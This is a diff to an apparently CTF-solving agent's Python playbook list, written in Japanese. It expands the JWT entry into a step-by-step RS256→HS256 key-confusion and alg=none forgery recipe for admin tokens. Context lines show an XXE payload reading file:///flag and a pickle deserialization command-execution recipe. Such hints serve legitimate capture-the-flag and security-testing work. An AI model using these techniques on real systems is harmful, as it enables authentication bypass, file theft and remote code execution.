@@ -57,8 +57,11 @@ _PLAYBOOKS: list[tuple[tuple[str, ...], str]] = [
      "XXE: POST する XML に外部実体を仕込む: "
      "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///flag\">]><r>&x;</r>。応答に展開される。"),
     (("auth", "jwt"),
-     "JWT: 公開鍵を取得(/.well-known/jwks.json 等)。alg=none で署名を外す、または RS256→HS256 に"
-     "変え公開鍵を HMAC 鍵として run_python の hmac で署名。admin/role クレームを書き換える。"),
+     "JWT(RS256→HS256混同): /pubkey や /.well-known で公開鍵PEMを取得。"
+     "**取得したPEM文字列そのものをHMAC鍵**に HS256 で署名する(pyjwtを使う: "
+     "jwt.encode({'role':'admin','username':'admin'}, pem_str, algorithm='HS256'))。"
+     "PEMは取得バイトそのまま/末尾改行有無/BEGIN-END込みを数通り試す。alg=none(署名空)も試す。"
+     "得たトークンを Authorization: Bearer で保護ページ(/flag)に付ける。hmac手組みは避ける。"),
     (("deser", "serial"),
      "Deserialization: run_python で pickle 等のペイロードを生成(__reduce__ でコマンド)、"
      "base64 して該当パラメータへ POST する。"),
